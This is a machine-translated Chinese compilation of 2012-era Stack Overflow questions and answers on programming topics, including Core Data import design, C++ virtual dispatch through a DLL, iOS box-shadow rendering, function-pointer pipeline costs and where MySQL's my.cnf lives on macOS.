我是 iOS 编程的新手，我有一个项目正在进行中，伴随着它我不断学习 iOS 的新功能，所以它来到了 Core Data。我已经阅读了它的基本教程和解释。但遗憾的是，他们没有很好地涵盖创建复杂的数据库。我的目标是创建一个从服务器下载大约 20mb XML 文件的数据文件的应用程序。并将其中的数据加载到 App 的 Core Data 数据库中，供用户交互。

我将尝试解释我尝试构建的架构

每个文件都作为类型 A 的实体加载到数据库中。每个实体 A 有几个属性和一个实体 B 数组。（一对多关系）每个实体 B 有几个属性和一个实体 C 数组。（一对多关系)

我的 XML 结构就像

```
<a>
 <set of b's>
  <b1>
   <set of c's>
    <c1>
    <c2>
    ...
    <cn>
   </set of c's>
  </b1>
  <b2>
  ....
  <bn>
 </set of b's>
</a> 
```

由于实体 A 仅代表导入的不同文件，因此它们是在我在服务器上创建可用数据文件列表时创建的。然后我计划下载文件，解析它并将它的数据加载到数据库中。当我运行我的解析器时，首先我得到创建实体 B 所需的所有数据，然后我可以创建一个字典数组来保存实体 C 的数据，或者我可以将实体插入 B 的集合中。

我遇到问题的部分是如何将实体插入 MOC 以及如何保存它。我的意思是我应该对所有类型的实体使用相同的 MOC 并保存对它的更改吗？或者我应该例如将“B”插入A的MOC，然后将“C”插入B的MOC，然后首先保存B的MOC中的更改，然后保存在A的MOC中？

我的解析器以块的形式读取数据，所以我需要一些事件来告诉它，我已经添加了当前块中的所有数据并且它被保存并且它可以开始读取下一个块。

我将不胜感激那里的任何帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T15:34:52.687

只使用一个 MOC，传递它并用它做任何事情，一个保存任何地方一次会影响所有事情。

此外，您可能想看看为什么在这里使用 Core Data，Core Data 对于实际对象很方便，但如果它是您想要存储的纯数据，那么 Core Data 有**很多**限制，如果您正在考虑，您可能不会想到它作为一个 SQL 数据库。

-

关于将数据加载到对象中。您可以按任意顺序创建这些 A、B、C 对象，并随时或稍后设置它们之间的属性和关联，它真的非常灵活，只需将它们视为任何其他objective-c 对象

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T15:50:49.903

Core Data 是一个非常强大的框架，它为您提供了所有缓存、数据完整性验证机制和优化。如果您从头开始编写我们自己的模型，您必须自己实现的东西。

但是，它不是关系数据库，而且肯定不是 SQL。是的，您很可能会使用 SQLite 作为后备存储，但您不能直接编写 SQL 语句。对于大多数事情，无论如何你都不需要。

在数据库中存储大数据文件时，出于性能考虑不建议这样做。Apple 建议我们将 URL 存储到数据库中的文件，并将数据作为文件保存到文档目录。为了进一步鼓励这一点，他们引入了核心数据实体属性的“快捷方式”，以自动将数据存储为外部参考。

使用模式很简单。将 MOC 视为暂存器。当您创建一个时，您会从持久存储（即数据库）中的所有可用数据开始。然后您插入新的、修改现有的和删除数据，并且每当您保存 MOC 时，数据将被传输到持久存储。或者，如果您不想保存更改，您只需将其丢弃。它还支持撤消管理。

# c++ - 使库函数使用从库类派生的类

> ID：10757128
> 
> 赞同：4
> 
> 时间：2012-05-25T15:23:29.277
> 
> 标签：c++, dll, polymorphism, vtable

我有一个可以自己构建的 .dll。我有一个类 ，`Lion`它派生自库中的一个类`Cat`，它覆盖了一个虚函数 ，`Leap()`。我想创建一个类型的对象`Lion`，将它传递给期望类型为的库函数`Cat`，这样当他们调用 时`Cat->Leap()`，他们使用覆盖的虚函数`Lion->Leap()`，

这是可能吗？

到目前为止，我尝试过的所有事情都以被忽略的覆盖函数告终。我猜这是因为在编译库时，它会解决如何解决对 的调用`Leap()`，此时我的派生类型不存在。或者，因为库引用类型的对象`Cat`（实际上是类型`Lion`），所以它调用`Cat::Leap()`，而不是`Lion::Leap()`。

我曾认为该函数是虚拟的这一事实意味着，即使它是从库中调用的，它也会通过在运行时查看对象的 vtable 来解决调用，这将是派生的类型。

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T15:27:42.893

为了让它工作，这个库需要以某种方式编写：它应该`Cat`通过引用或指针来获取它的 s，而不是通过值（不幸的是，这是 C++ 中传递参数的默认方式）。如果您将 a 传递`Lion`给期望 a`Cat`值的函数，则将`Lion`被[*切片*](http://en.wikipedia.org/wiki/Object_slicing)为 a ，并就函数而言`Cat`有效地变为 a 。`Cat`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-25T16:33:00.883

在库的头文件中声明一个虚拟飞跃：

```
class Cat {
public:
  virtual void leap() const { /* ... */ };
  /// ...
}; 
```

并`Cat`通过在库源代码中传递引用或指针来使用 s：

```
void LibraryUsesCat(const Cat*c)
{ c-> leap(); } 
```

在您的应用程序中覆盖虚拟功能：

```
class Lion : public Cat {
public:
  void leap() const { /* ... */ }
  /// ...
}; 
```

这应该可以工作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-25T15:33:44.857

虚函数启用在运行时确定的动态/后期绑定。因此，您不必担心编译时间决定会影响您的代码。

只要一个函数在基类中是虚函数，它在派生类中被覆盖，并且您的库函数通过 const 引用或指针调用，无论在何处定义类，它都可以正常工作。

很有可能您正在对对象进行切片并最终只得到基类的一半，因为您通过值而不是指针或引用传递。

可以这样想：

**如果我将狮子作为猫传递，按价值，它将复制狮子被投进的“猫”。将使用该副本，但该副本仅是猫的一半，因此不可能分派给狮子的一半-副本中不存在。这些函数和数据成员根本不存在于其中。通过引用或指针传递可确保您仍然拥有可用的整个原始狮子对象。**

# javascript - 我应该如何使用 requireJs 编写规范文件？

> ID：10757134
> 
> 赞同：4
> 
> 时间：2012-05-25T15:23:51.930
> 
> 标签：javascript, backbone.js, requirejs, jasmine

我有一个看起来像这样的模型：

```
//myModel.js
define([], function () {
    var MyModel = Backbone.Model.extend({
        // my code
    });
    return MyModel
}); 
```

那么如果我想为这个模型编写一个规范，我应该如何使用 requireJs 加载模型？

我确实尝试了以下方法：

```
//myModel.spec.js
define([
    "js/models/myModel",
], function (MyModel) {
    describe("My model", function()
    {
        beforeEach(function () 
        {
            this.myModel = new MyModel({
                name: "my title"
            });
        });
    });
}); 
```

这是正确的方法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T21:40:15.837

是的，这是正确的。使用 RequireJS 进行测试的好处是你不得不在你的定义块中声明你所有的测试依赖。根据定义，单元测试应该只测试*一件事。*因此，如果您在一个测试中有多个依赖项，那么您根本没有进行真正的“单元测试”，这是一种代码味道。

理想情况下，唯一的依赖项应该是正在测试的文件。如果该文件本身有任何依赖项，例如服务器端服务或复杂的异步 APIS，您可以使用存根和模拟来模拟它们。查看 SinonJS 以获得一个很棒的存根/模拟库。

# c# - C#中的图像位置

> ID：10757137
> 
> 赞同：-3
> 
> 时间：2012-05-25T15:24:08.790
> 
> 标签：c#

我可以获得图像属性：

```
imgObj.Width
imgObj.Height 
```

但是我如何获得它的左上角位置？

我会想象这样的事情：

```
imgObj.Xpos
imgObj.Ypos 
```

对不起太简单的问题:-)

编辑：

WPF，imgObj 是我使用工具箱添加的一些图像

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-25T15:26:47.403

尝试`imgObj.Margin.Top`并`imgObj.Margin.Left`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-25T15:28:28.283

如果它是一个 Windows 窗体应用程序，您可以获得使用`imgObj.Location.X`和等信息`imgObj.Location.Y;`。

# android - Mono for Android OnPause 事件未在 Galaxy Nexus 上触发

> ID：10757138
> 
> 赞同：3
> 
> 时间：2012-05-25T15:24:12.473
> 
> 标签：android, xamarin.android, android-4.0-ice-cream-sandwich, galaxy, android-event

我将我的第一个 Mono for Android 项目（针对 API 级别 8，最低 Android 2.2）放在一起，并将其部署到运行 2.3.4 的 HTC Incredible [1]。`OnCreate`在我的主要活动中，一切都运行良好，断点`OnStart`, `OnResume`, `OnPause`, 并且`OnStop`所有触发都如 Xamarin 的[活动生命周期教程](http://docs.xamarin.com/android/tutorials/Activity_Lifecycle)中所述。

在不更改任何项目设置的情况下，我更换了运行 4.0.2 的三星 Galaxy Nexus 并部署了相同的应用程序。它调用`OnCreate`得很好，但当我离开应用程序时从未触发任何其他事件。

如何在 Galaxy Nexus 上的冰淇淋三明治 (ICS) 中触发这些活动事件？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-25T15:24:12.863

在 Galaxy Nexus 上运行第一个部署时，您将看到它部署了“armeabi-v7a - 40202”程序集。出于某种原因，当这个问题开始让事情变得困难时，我就陷入了困境。

如果您转到项目属性并选中“支持的架构”下的“armeabi-v7a”框，这些事件将按预期开始被触发。

![armeabi-v7a 支持的架构复选框](../Images/7f7cead50d66b78dcbc826d658dc76b0.png)

# ios - 如何使用 Apple LLVM Compiler 3.0 收集物理 iPhone 上的代码覆盖率？

> ID：10757142
> 
> 赞同：2
> 
> 时间：2012-05-25T15:24:25.097
> 
> 标签：ios, code-coverage, xcode4.3, llvm-3.0

最新的 XCode 的 Apple LLVM 编译器 3.0 是否支持从物理 iPhone 机器收集代码覆盖率数据？如果是，如何设置？

下面给出了 gcc 编译器的解决方案。但我想知道这对于 LLVM 编译器 3.0 是否可行。因为对于我们的项目，当从llvm编译器切换到LLVM gcc时，我们遇到了一些编译错误，所以我们想坚持使用苹果的llvm编译器。

[https://stackoverflow.com/questions/5101014/code-coverage-not-showing-results-using-xcode-gcov/5140459#5140459](https://stackoverflow.com/questions/5101014/code-coverage-not-showing-results-using-xcode-%20gcov/5140459#5140459)

我找到了解决方案。 [http://www.gerardcondon.com/blog/2012/02/21/code-coverage-updates-for-xcode-4-dot-3/](http://www.gerardcondon.com/blog/2012/02/21/code-coverage-updates-for-xcode-4-dot-3/)

我现在可以从设备获取覆盖数据。但是在解析 gcdata 时遇到了另一个问题。采集到的gcdata标记为4.2版本，而Apple Compiler 3.0生成的gcno文件为4.4。当使用调用 gcov（默认为 4.2.1）的 lcov 生成 cov 信息文件时，它无法解析 gcdata。我尝试安装新版本的 gcov(gcc4.4.7)，但仍然失败。我仍在对此进行一些调查。希望我不需要编写自己的lcov。:-)

谢谢。

# image - 如何在复杂图像中找到并隔离二维码？

> ID：10757143
> 
> 赞同：1
> 
> 时间：2012-05-25T15:24:48.330
> 
> 标签：image

使用 MatLab 我需要在图像数据库中找到二维码。然后我需要隔离这个二维码。最后，我将使用 ZXing 来解码信息。

*图像将始终只有一个二维码。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-25T16:43:44.103

[ZXing](http://code.google.com/p/zxing/)包括一个 QR 码检测器和一个解码器，因此理论上您可以将每张图像传递给 ZXing 并查看它是否找到代码。

也就是说，ZXing 检测器针对来自手机等相机的图像进行了调整，并且在没有某种预处理的情况下可能无法很好地处理具有非常不同特征的图像集。

# oracle - 从重叠日期创建时间线

> ID：10757144
> 
> 赞同：0
> 
> 时间：2012-05-25T15:24:48.497
> 
> 标签：oracle, date, range, analytics

鉴于此表：

```
CREATE TABLE positions
   (    "EMP_ID" CHAR(10 BYTE), 
    "GTYPE" NUMBER, 
    "AMT" NUMBER, 
    "START_DATE" DATE, 
    "STOP_DATE" DATE
   ) 
```

这个数据：

```
 Insert Into positions (Emp_Id,Gtype,Amt,Start_Date,Stop_Date)
   select 'XA0022',1,1000,'01-MAY-2010','08-MAY-2012' from dual union
   Select 'XA0022',1,1000,'01-MAY-2010','31-DEC-2012' From Dual Union
   Select 'XA0022',2,500,'03-APR-2012','15-JUL-2012' From Dual Union
   Select 'XA0022',1,421,'01-MAY-2012','23-MAY-2012' From Dual Union
   Select 'XA0022',1,1514,'09-MAY-2012','31-DEC-2012' From Dual union
   select 'XA0022',1,600,'24-MAY-2012','24-MAY-2012' from dual; 
```

我如何做到这一点：

```
from            to          type1   type2
   01-May-2010  02-Apr-2012     2000    0
   03-Apr-2012  30-Apr-2012     2000    500
   01-May-2012  07-May-2012     2421    500
   08-May-2012  08-May-2012     2421    500
   09-May-2012  22-May-2012     2935    500
   23-May-2012  23-May-2012     2935    500
   24-May-2012  15-Jul-2012     3114    500
   16-Jul-2012  31-Dec-2012     3014    0 
```

注意：金额在 start_date 生效，在 stop_date 之后的第二天无效。

任何指点都感激不尽！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-28T01:53:54.517

使用 Oracle 的支点。

[甲骨文枢轴](http://www.oracle.com/technetwork/articles/sql/11g-pivot-097235.html)

```
select * from
(select emp_id, gtype, amt, start_date, stop_date
from positions)
pivot (sum(amt) as amt for (gtype) in (1 as "TYPE1", 2 as "TYPE2"))
order by emp_id, start_date; 
```

有了更多信息（谢谢），像这样？

```
select emp_id, gtype, start_date, 
case when next_amt <> amt then next_start_date -1 end as to_date
from
(select emp_id, gtype, start_date, amt,
lead(start_date,1) over (order by emp_id, start_date) next_start_date,
lead(amt,1) over (order by emp_id, start_date) next_amt
from
positions) 
```

# ios - iPhone iOS 无法正确显示 box-shadow

> ID：10757146
> 
> 赞同：72
> 
> 时间：2012-05-25T15:25:08.407
> 
> 标签：ios, webkit, css, mobile-webkit

# 该设计

响应式设计上的联系表单具有带有嵌入阴影和常规外部阴影的输入字段。见下图。

![手机输入栏设计](../Images/f86e0a896a7d478a8841bc2e147e8f7a.png)

* * *

# 编码

```
input {
    background:#fff;
    height:auto;
    padding:8px 8px 7px;
    width:100%;
    box-sizing:border-box;
    -moz-box-sizing:border-box;
    -webkit-box-sizing:border-box;
    border:#fff solid 3px;
    border-radius:4px;
    box-shadow:0px 0px 5px rgba(0, 0, 0, .25), inset 2px 2px 3px rgba(0, 0, 0, .2);
} 
```

* * *

# 问题

iOS v4+ 不能正确显示 box-shadow。见下图。

![输入框阴影渲染不正确](../Images/ed887392a4e6770058e4e12dff35e1e5.png)

* * *

# 经过测试

我尝试使用-webkit-box-shadow。

```
-webkit-box-shadow:0px 0px 5px rgba(0, 0, 0, .25),
                   inset 2px 2px 3px rgba(0, 0, 0, .2); 
```

我已应用于`display:block;`输入元素。

* * *

# 当前的解决方法

我宁愿不必这样做，但这是获得所需效果的唯一方法。

**HTML**

```
<p><input /></p> 
```

**CSS**

```
p {
   width:50%;
   box-sizing:border-box;
   -moz-box-sizing:border-box;
   -webkit-box-sizing:border-box;
   box-shadow:0px 0px 5px rgba(0, 0, 0, .35);
   border-radius:4px;
}

    input {
        background:#fff;
        height:auto;
        padding:8px 8px 7px;
        width:100%;
        box-sizing:border-box;
        -moz-box-sizing:border-box;
        -webkit-box-sizing:border-box;
        border:#fff solid 3px;
        border-radius:4px;
        box-shadow:inset 2px 2px 3px rgba(0, 0, 0, .2);
    } 
```

即使使用这种解决方法，iOS 上的嵌入阴影也无法正确呈现；但它足够接近。

* * *

# 我的问题

是否可以在 iOS 设备上正确渲染单个元素上的多个 box-shadow 实例？如果不是，那么嵌入的阴影呢？还是我错误地使用了这个属性及其值？

**提前致谢！**

* * *

## 回答 #1

> 赞同：205
> 
> 时间：2012-05-25T15:42:53.667

尝试添加`-webkit-appearance: none;`iOS 往往会弄乱表单。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2020-02-13T09:41:15.050

我在尝试在无效输入周围添加框阴影时遇到问题（在单击提交之前）。

使用`-webkit-appearance: none;`了一段时间，但我注意到 chrome 复选框现在不见了。

这是我的 hack，或多或少可以跨浏览器工作。看起来 safari 是新的“互联网浏览器”：-/

```
input:invalid, select:invalid, textarea:invalid, .invalid {
    background-clip: padding-box; /* Safari fix */
    box-shadow: 0 0 5pt 2pt rgba(255,0,0,.75) !important;
}

select:invalid {
    border: 1px solid red; /* Safari fix */
}

input[type="checkbox"]:invalid{
    background: red; /* Safari fix */
}

input[type="radio"]:invalid{
    background: red; /* Safari fix */
} 
```

[![苹果浏览器](../Images/623697d35d4164fbae4bf6745582e856.png)](https://i.stack.imgur.com/imwIQ.jpg) [![其它浏览器](../Images/8a493d1e6870c5397d997e225a6691bf.png)](https://i.stack.imgur.com/9pDPh.jpg)

# nhibernate - 如何 NHibernate 将多个类映射到同一个表

> ID：10757149
> 
> 赞同：1
> 
> 时间：2012-05-25T15:25:09.930
> 
> 标签：nhibernate, inheritance, fluent-nhibernate, nhibernate-mapping

是否可以将 2 个类映射到同一张表？

```
class Foo {}
class Bar : Foo {}
class Zap : Bar {} 
```

Foo 和 Bar 在一个会话工厂中是 Fluent Nhibernate 自动映射的。

所有 3 个类都在不同的会话工厂中使用 Fluent 映射进行映射：

```
class FooMap :  Class<Foo> {}

class BarMap :  Subclass<Bar> {}

class ZapMap :  Subclass<Zap> {
    public ZapMap() {
          Table("Bar");
    }
} 
```

我希望 Zap 映射到 Bar 表而不是创建一个新表。这可能吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T15:55:03.457

如果您将 BarMap 更改为：

```
class BarMap : Class<Bar> { } 
```

并且您的 Bar 表上有一个“类型”列（类型为字符串，用于区分 Bar 和 Zap），那么它应该可以工作

看看关于子类的页面底部附近的[http://fluentnhibernate.wikia.com/wiki/Fluent_mapping （你想要table-per-class-hierarchy）](http://fluentnhibernate.wikia.com/wiki/Fluent_mapping)

# ios - 破解 ios ui 响应者链

> ID：10757154
> 
> 赞同：0
> 
> 时间：2012-05-25T15:25:26.183
> 
> 标签：ios, cocoa-touch, uiscrollview, uiresponder

我在处理触摸事件时面临一个微妙的问题。这可能不是通常的东西，但我认为这是可能的。我只是不知道怎么...

我有一个主视图 (A) 和主视图 (B) 有很多子视图 1,2,3,4,5,...

```
MainView
 SubView(A)
   1
   2
   3
 SubView(B)
   1
   2
   3 
```

其中一些子子视图（1,2,4）是滚动视图。

碰巧我想用两个手指盘在 A 和 B 之间切换。

我曾尝试将 UIPanGestureRecognizer 附加到 MainView，但滚动视图取消了触摸，它仅在某些时候有效。

我需要一种一致的方法来首先捕获触摸，检测它是否是两个手指平移，然后才决定它是否会向下（或向上......我不确定）响应链传递触摸。

我试图创建一个顶级视图来处理它，但我无法让触摸通过该视图。

我发现很多人有类似的问题，但无法从他们的解决方案中找到解决这个问题的方法。

如果有人能给我一盏灯，那就太好了，因为我已经对此感到绝望。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-25T15:57:08.697

您可以创建一个顶级视图来捕获触摸和触摸坐标，然后您可以检查触摸坐标是否在子视图内。您可以使用

```
BOOL CGRectContainsPoint(CGRect rect, CGPoint point) 
```

方法。矩形是视图的框架，点是接触点。

请注意，框架和触摸位置是相对于它们的超级视图，因此您需要将它们转换为应用程序窗口的坐标系。

或者也许它会更有帮助

[同时在多个 UIView 上接收触摸事件](https://stackoverflow.com/questions/4585007/receiving-touch-events-on-more-then-one-uiview-simultaneously)

# .net - UIElement.UpdateLayout()在什么情况下可以调用Environment.FailFast？

> ID：10757164
> 
> 赞同：2
> 
> 时间：2012-05-25T15:26:28.340
> 
> 标签：.net, wpf, error-handling

所以我有一个控件，它响应它的项目被更改，调用 UpdateLayout()。这会产生如下所示的堆栈跟踪：

> 说明：应用程序通过 System.Environment.FailFast(string message) 请求进程终止。消息：不可恢复的系统错误。堆栈：在 System.Environment.FailFast(System.String) 在 MS.Internal.Invariant.FailFast(System.String, System.String) 在 MS.Internal.Invariant.Assert(Boolean, System.String) 在 System.Windows。 Window.GetWindowMinMax() 在 System.Windows.Window.MeasureOverride(System.Windows.Size) 在 System.Windows.FrameworkElement.MeasureCore(System.Windows.Size) 在 System.Windows.UIElement.Measure(System.Windows.Size)在 System.Windows.ContextLayoutManager.UpdateLayout() 在 System.Windows.UIElement.UpdateLayout() 在

显然，在某些情况下，GetWindowMinMax() 会导致某种 Assert() 失败，这会导致调用 Environment.FailFast。在调用 UpdateLayout 之前我可以检查哪些条件以确保不会发生这些情况以避免遇到此错误？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T15:41:41.437

使用 Reflector 并查看`GetWindowMinMax`. 这是断言：

```
Invariant.Assert (!this.IsCompositionTargetInvalid, 
    "IsCompositionTargetInvalid is supposed to be false here") ; 
```

因此，您的窗口似乎还没有真正创建为 Win32 窗口，或者它的 Win32 窗口已经被破坏。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-22T18:47:44.497

我对此有一个一致的复制：

```
 hwndSource = new System.Windows.Interop.HwndSource(p);
        this.Visibility = System.Windows.Visibility.Hidden;
        hwndSource.RootVisual = this; 
```

将 RootVisual 设置为隐藏窗口将触发 FailFast。

# c - 函数指针是否强制清除指令流水线？

> ID：10757167
> 
> 赞同：28
> 
> 时间：2012-05-25T15:26:36.030
> 
> 标签：c, performance, x86, function-pointers, pipeline

现代 CPU 具有广泛的流水线，也就是说，它们在实际执行指令之前很久就加载了必要的指令和数据。

有时，加载到管道中的数据会失效，必须清除管道并重新加载新数据。重新填充管道所需的时间可能相当长，并导致性能下降。

如果我在 C 中调用函数指针，管道是否足够智能，可以意识到管道中的指针是函数指针，并且它应该跟随该指针以执行下一条指令？还是有一个函数指针会导致管道清理并降低性能？

我在 C 中工作，但我想这在 C++ 中更为重要，因为许多函数调用都是通过 v-tables 进行的。

* * *

***编辑***

@JensGustedt 写道：

> 要真正影响函数调用的性能，您调用的函数必须非常简短。如果您通过测量代码观察到这一点，您肯定应该重新审视您的设计以允许内联该调用

不幸的是，这可能是我落入的陷阱。

出于性能原因，我编写了小而快的目标函数。

但是它被函数指针引用，因此可以很容易地用其他函数替换它（只需让指针引用不同的函数！）。因为我通过函数指针引用它，所以我认为它不能被内联。

所以，我有一个非常简短的非内联函数。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-06-04T23:44:30.043

在某些处理器上，间接分支总是会至少清除部分管道，因为它总是会错误预测。对于有序处理器尤其如此。

例如，[我在我们开发的处理器上运行了一些计时](http://assemblyrequired.crashworks.org/2009/01/19/how-slow-are-virtual-functions-really/)，比较了内联函数调用、直接函数调用和间接函数调用（虚拟函数或函数指针；它们在这个平台上是相同的）的开销。

我编写了一个很小的函数体，并在数百万次调用的紧密循环中对其进行了测量，以确定调用惩罚的成本。“内联”函数是一个控制组，仅测量函数体的成本（基本上是单个加载操作）。直接函数测量了正确预测的分支的惩罚（因为它是一个静态目标，PPC 的预测器总是可以做到这一点）和函数序言。间接函数测量`bctrl`间接分支的惩罚。

**614,400,000 次函数调用**：

```
inline:   411.924 ms  (   2 cycles/call )
direct:  3406.297 ms  ( ~17 cycles/call )
virtual: 8080.708 ms  ( ~39 cycles/call ) 
```

如您所见，直接调用比函数体多花费 15 个周期，而虚拟调用（[完全等同于函数指针调用](https://www-01.ibm.com/chips/techlib/techlib.nsf/techdocs/F7E732FF811F783187256FDD004D3797/$file/pem_64bit_v3.0.2005jul15.pdf)）比直接调用多花费 22 个周期。这恰好是在管道开始（指令获取）和分支 ALU 结束之间大约有多少个管道阶段。因此，在此架构上，间接分支（也称为虚拟调用）会在**100% 的时间内**清除 22 个流水线阶段。

其他架构可能会有所不同。您应该通过直接的经验测量或 CPU 的流水线规格来做出这些决定，而不是假设处理器“应该”预测什么，因为实现是如此不同。在这种情况下，会发生管道清除，因为分支预测器在退出之前无法知道 bctrl 将去哪里。充其量它可以猜测它与最后一个 bctrl 的目标相同，而这个特定的 CPU 甚至不会尝试这种猜测。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-05-25T16:38:12.987

调用函数指针与调用 C++ 中的虚方法没有根本不同，就此而言，它与返回也没有根本不同。向前看，处理器将识别出一个通过指针的分支即将出现，并将决定它是否可以在预取管道中安全有效地解析指针并遵循该路径。这显然比遵循常规的相对分支更加困难和昂贵，但是，由于间接分支在现代程序中如此普遍，因此大多数处理器都会尝试这样做。

正如 Oli 所说，只有在条件分支上出现错误预测时才需要“清除”管道，这与分支是通过偏移量还是通过变量地址无关。但是，处理器可能具有根据分支地址的类型进行不同预测的策略——通常，由于地址错误的可能性，处理器不太可能积极地遵循条件分支的间接路径。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2018-05-27T22:39:52.537

通过函数指针进行的调用*不一定*会导致管道清除，但*可能会*，具体取决于场景。关键是CPU能否提前有效预测分支的目的地。

现代“大”乱序核心处理*间接调用¹*的方式大致如下：

*   一旦你执行了几次间接分支，间接分支预测器将尝试预测将来发生分支的地址。
*   第一个间接分支预测器非常简单，只能“预测”单个固定位置。
*   后来的预测器（包括大多数现代 CPU 上的预测器）要复杂得多，通常能够很好地预测间接跳转的重复模式，并将跳转目标与早期条件或间接分支的方向相关联。
*   *如果*预测成功，间接调用的代价与普通直接调用相似，而这个代价很大程度上与其余代码“脱节”（即不[参与依赖链](https://stackoverflow.com/a/49205689/149138)），因此对除非调用非常密集，否则代码的最终运行时间可能会很小。
*   另一方面，如果预测不成功，则会得到完全错误预测，类似于[分支方向错误预测](https://stackoverflow.com/q/11227809/149138)。你不能给这种错误预测的成本设定一个固定的数字，因为它取决于周围的代码，但它通常会在前端造成大约 20 个周期的泡沫，并且运行时的总体成本通常以相似的方式结束。

因此，鉴于这些基础知识，我们可以对某些特定场景中发生的情况做出一些有根据的猜测：

1.  函数指针总是指向同一个函数，几乎总是¹可以很好地预测并且成本与常规函数调用大致相同。
2.  在几个目标之间随机交替的函数指针几乎总是会被错误预测。充其量，我们可以希望预测器总是预测任何最常见的目标，所以在最坏的情况下，目标是在目标之间均匀随机选择`N`的，预测成功率的范围是`1 / N`（即，随着 N 趋于无穷大，趋于零）。在这方面，间接分支的最坏情况行为比条件分支更差，条件分支的最坏情况误预测率通常为 50% ²。
3.  具有中间某处行为的函数指针的预测率，例如，有些可预测（例如，遵循重复模式），将在很大程度上取决于硬件的细节和预测器的复杂性。现代英特尔芯片具有相当好的间接预测因子，但细节尚未公开。传统观点认为，他们正在使用[TAGE 预测器的一些间接变体，](https://www.jilp.org/jwac-2/program/cbp3_07_seznec.pdf)也用于条件分支。

* * *

¹即使对于单个目标也会发生错误预测的情况包括第一次（或几次）遇到该函数，因为预测器无法预测它尚未见过的间接调用！另外，CPU中预测资源的大小是有限的，所以如果函数指针有一段时间没有被使用，最终预测资源会被其他分支使用，下次调用时会出现错误预测.

²确实，一个非常简单的条件预测器可以简单地预测最近最常见的方向，在完全随机的分支方向上应该有 50% 的预测率。要获得显着低于 50% 的结果，您必须设计一种对抗性算法，该算法基本上对预测器进行建模，并始终选择与模型相反的方向分支。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-25T15:46:32.887

除了额外的间接级别之外，函数指针调用和“正常”调用之间没有太大区别。因此可能会涉及更大的延迟；如果目标地址尚未在缓存或寄存器中，则 CPU 在从主内存中检索它时可能必须等待。

所以答案是；是的，管道可能会停止，但这与正常的函数调用没有什么不同。和往常一样，分支预测和乱序执行等机制可以帮助减少损失。

# mysql - macOS 上 my.cnf 文件的位置

> ID：10757169
> 
> 赞同：216
> 
> 时间：2012-05-25T15:26:43.613
> 
> 标签：mysql, database, macos

我正在尝试按照[本教程](http://www.cyberciti.biz/tips/how-do-i-enable-remote-access-to-mysql-database-server.html)启用对 MySQL 的远程访问。问题是，`my.cnf`文件应该放在哪里？我正在使用 Mac OS X Lion。

* * *

## 回答 #1

> 赞同：262
> 
> 时间：2012-05-25T15:32:44.327

[MySQL论坛上的这个帖子](http://forums.mysql.com/read.php?11,366143,376017#msg-376017)说：

> *默认情况下，OS X 安装不使用 my.cnf，而 MySQL 只使用默认值。要设置您自己的 my.cnf，您可以直接在 /etc 中创建一个文件。*

OS X 在`/usr/local/mysql/support-files/`.

如果您在那里找不到它们，MySQLWorkbench 可以通过以下方式为您创建它们：

1.  打开连接
2.  在菜单中的“实例”下选择“选项文件”。
3.  MySQLWorkbench 将搜索 my.cnf，如果找不到，它会为您创建它

* * *

## 回答 #2

> 赞同：86
> 
> 时间：2014-06-16T19:25:22.817

如果是 Mac OS X Maverick，当通过 Homebrew 安装 MySQL 时，它位于`/usr/local/opt/mysql/my.cnf`

* * *

## 回答 #3

> 赞同：72
> 
> 时间：2016-06-09T14:57:29.040

通常，在 Unix 和类 Unix 系统上，MySQL/MariaDB 程序读取以下位置的配置/启动文件（按指定顺序）：

*   `/etc/my.cnf`- 全球的
*   `/etc/mysql/my.cnf`- 全球的
*   `SYSCONFDIR/my.cnf`- 全球的

    > `SYSCONFDIR`表示在构建 MySQL 时使用`SYSCONFDIR`选项指定的目录。`CMake`默认情况下，这是位于编译安装目录下的 etc 目录。

*   `$MYSQL_HOME/my.cnf`- 服务器特定（仅限服务器）

    > `MYSQL_HOME`是一个环境变量，包含服务器特定`my.cnf`文件所在目录的路径。如果`MYSQL_HOME`未设置并且您使用该`mysqld_safe`程序启动服务器，`mysqld_safe`请将其设置`BASEDIR`为 MySQL 基本安装目录。

*   指定的文件（`--defaults-extra-file=path`如果有）

*   `~/.my.cnf`- 用户特定
*   `~/.mylogin.cnf`- 用户特定（仅限客户）

^(来源：[使用选项文件](https://dev.mysql.com/doc/refman/5.7/en/option-files.html)。)

> 注意：在 Unix 平台上，MySQL 会忽略全局可写的配置文件。这是有意作为一种安全措施。

* * *

此外，在 Mac 上还有一种简单的检查方法。

1.  跑：`sudo fs_usage | grep my.cnf`

    ^(这将实时报告与该文件相关的任何文件系统活动。)

2.  在另一个终端中，重新启动您的 MySQL/MariaDB，例如

    ```
    brew services restart mysql 
    ```

    或者：

    ```
    brew services restart mariadb 
    ```

3.  在带有 的终端上`fs_usage`，应显示正确的位置，例如

    ```
    15:52:22  access            /usr/local/Cellar/mariadb/10.1.14/my.cnf                                         0.000002   sh 
    ```

    因此，如果该文件不存在，请创建一个。

* * *

## 回答 #4

> 赞同：34
> 
> 时间：2012-05-25T15:35:37.477

我不知道您使用的是哪个版本的 MySQL，但以下是Mac OS X 上5.5 版（取自[此处）的 my.cnf 文件的可能位置：](http://dev.mysql.com/doc/refman/5.5/en/option-files.html)

1.  `/etc/my.cnf`
2.  `/etc/mysql/my.cnf`
3.  `SYSCONFDIR/my.cnf`
4.  `$MYSQL_HOME/my.cnf`
